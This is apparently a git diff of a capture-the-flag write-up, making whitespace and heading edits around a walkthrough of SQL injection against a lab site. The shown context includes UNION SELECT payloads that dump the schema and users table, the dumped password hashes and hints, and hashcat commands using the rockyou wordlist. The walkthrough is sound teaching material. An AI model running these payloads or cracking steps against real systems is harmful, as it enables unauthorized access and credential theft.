@@ -65,6 +65,7 @@ Running this on the website, we get the following:
 input: " UNION SELECT 1,sql FROM sqlite_master WHERE type='table';--
 ```
 ![Table Dumped!](Images/table_dump.png)
+
 We see that we have a table users with the following format:
 ```sql
 CREATE TABLE users ( username text primary key not null, password_hash text not null, hint text not null, bio text not null)
@@ -76,6 +77,7 @@ input: " UNION SELECT username, hint FROM users;--
 ```
 ![Hashes Dumped!](Images/dump_hashes.png)
 ![Hints Dumped!](Images/dump_hints.png)
+
 Here's the information that we got
 | User  | Password Hash                    | Hint                                                                           | Notes                                                                |
 |-------|----------------------------------|--------------------------------------------------------------------------------|----------------------------------------------------------------------|
@@ -86,6 +88,7 @@ Here's the information that we got
 | dania | 58970d579d25f7288599fcd709b3ded3 | الحيوان المفضل لدي (6 أحرف عربية فقط)                                          | Translates to "My Favorite Animal (6 Arabic Characters Only)"        |
 
 **NOTE**: We can also get the password hints by entering the corresponding username with an incorrect password.
+
 ![Password Hint](Images/password_hint.png)
 ## Automating SQL Injection with SQLMap
 Alternatively, instead of manually crafting a payload, we can use sqlmap - a tool that automatically does SQL injection. We can use it with the following command:
@@ -163,7 +166,9 @@ Speed.#1.........:  3930.8 MH/s (55.27ms) @ Accel:64 Loops:256 Thr:1024 Vec:2
 From the output above, we can see that hashcat can crack 3.9 **billion** hashes per second, which is way faster than anything I can do on my local machine.
 ## User 1: noob
 This is a very easy hash to crack - just Googling the hash or using a website like (Crackstation)[https://crackstation.net/], we are able to get the plaintext of our hash
+
 ![Crackstation](Images/crackstation.png)
+
 Alternatively, we can use hashcat along with [rockyou.txt](http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2) - a common wordlist used in password cracking by running the following command:
 ```
 hashcat -m 0 -a 0 8553127fedf5daacc26f3b677b58a856 rockyou.txt
@@ -412,7 +417,7 @@ cewl -d 0 -w animal_names https://ar.wikipedia.org/wiki/%D9%82%D8%A7%D8%A6%D9%85
 Googling a list of Arabic prefixes gives us [this list](https://www.researchgate.net/profile/Belal_Abuata/publication/255907855/figure/tbl1/AS:392609173393411@1470616729549/Arabic-Prefixes-and-Their-Meanings-Prefix-Meaning-Example.png), so we take these and put them in a file called `prefixes`.
 ###### Arabic suffixes
 Googling a list of Arabic suffixes gives us [this list](https://en.wiktionary.org/wiki/Category:Arabic_suffixes), so we take these and put them in a file called `suffixes`.
-####### Putting it all together
+###### Putting it all together
 We write a quick python script to combine these 3 files, similar to how we did for Carl's password. 
 (Note: we can't use the Combinator attack mode in hashcat as that only accepts 2 files to combine. However, there do exist [tools that do this](https://hashcat.net/wiki/doku.php?id=hashcat_utils#combinator3))
 ```python
